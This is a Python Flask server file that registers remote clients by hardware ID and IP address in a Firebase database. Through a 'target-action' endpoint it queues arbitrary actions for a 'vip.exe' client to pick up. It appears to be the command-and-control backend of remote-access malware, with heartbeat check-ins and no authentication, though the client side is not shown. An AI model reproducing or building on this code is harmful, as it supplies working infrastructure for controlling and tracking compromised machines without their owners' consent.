import os
import json
from flask import Flask, render_template, request, jsonify
import subprocess
import firebase_admin
from firebase_admin import credentials, db

app = Flask(__name__)

if not firebase_admin._apps:
    firebase_config_str = os.environ.get('FIREBASE_CONFIG_JSON')
    if not firebase_config_str:
        raise ValueError("CRITICAL: FIREBASE_CONFIG_JSON environment variable is missing!")
    
    cred_dict = json.loads(firebase_config_str)
    cred = credentials.Certificate(cred_dict)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://vipchaetos-default-rtdb.firebaseio.com/'
    })

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    hwid = data.get('hwid')
    ip_addr = request.remote_addr
    
    ref = db.reference(f'clients/{hwid}')
    ref.update({
        'ip': ip_addr,
        'status': 'ONLINE',
        'last_seen': 'Active Live'
    })
    
    return jsonify({"status": "registered", "assigned_hwid": hwid})

@app.route('/api/target-action', methods=['POST'])
def target_action():
    data = request.json
    hwid = data.get('hwid')
    action = data.get('action')

    if not hwid or not action:
        return jsonify({"message": "Invalid HWID or action."}), 400

    # I-save ang utos sa Firebase Realtime Database para makuha ng vip.exe client
    ref = db.reference(f'clients/{hwid}/pending_action')
    ref.set(action)

    return jsonify({"message": f"Action '{action}' queued for {hwid}!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)